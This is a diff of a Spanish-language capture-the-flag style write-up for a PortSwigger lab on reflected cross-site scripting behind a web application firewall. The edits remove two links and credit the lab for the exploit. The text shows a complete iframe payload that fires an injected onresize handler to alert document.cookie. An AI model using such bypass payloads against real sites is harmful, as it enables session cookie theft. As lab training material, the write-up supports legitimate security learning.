@@ -1,6 +1,6 @@
 # 2 - Reflected XSS into HTML context with most tags and attributes blocked
 
-> This lab contains a [reflected cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search functionality but uses a **web application firewall \(WAF\)** to protect against common [XSS](https://portswigger.net/web-security/cross-site-scripting) vectors.
+> This lab contains a reflected cross-site scripting vulnerability in the search functionality but uses a **web application firewall \(WAF\)** to protect against common XSS vectors.
 >
 >  To solve the lab, perform a cross-site scripting attack that bypasses the WAF and alerts `document.cookie`.
 
@@ -24,7 +24,7 @@ Lo que pasa es que estan blacklisted algunos eventos, realizamos lo mismo para l
 
 ![](../../../.gitbook/assets/imagen%20%28624%29.png)
 
-Vamos al exploit server y ponemos: 
+Vamos al exploit server y ponemos el exploit brindado por el lab: 
 
 `<iframe src="https://acab1fc11f6a4bb3818e083000280033.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E" onload=this.style.width='100px'>`
 
